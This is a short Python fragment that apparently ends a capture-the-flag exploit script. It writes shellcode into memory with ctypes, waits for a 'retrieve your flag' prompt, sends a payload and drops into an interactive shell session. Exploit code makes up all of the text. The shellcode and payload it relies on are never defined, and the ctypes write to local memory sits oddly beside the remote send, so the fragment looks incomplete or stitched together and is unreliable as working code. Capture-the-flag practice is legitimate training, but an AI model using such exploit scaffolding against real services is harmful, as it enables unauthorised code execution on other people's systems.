import ctypes
ctypes.cast(payload_addr, ctypes.c_char_p).value = shellcode

p.recvuntil('to retrieve your flag.\n')
p.sendline(payload)

p.interactive()
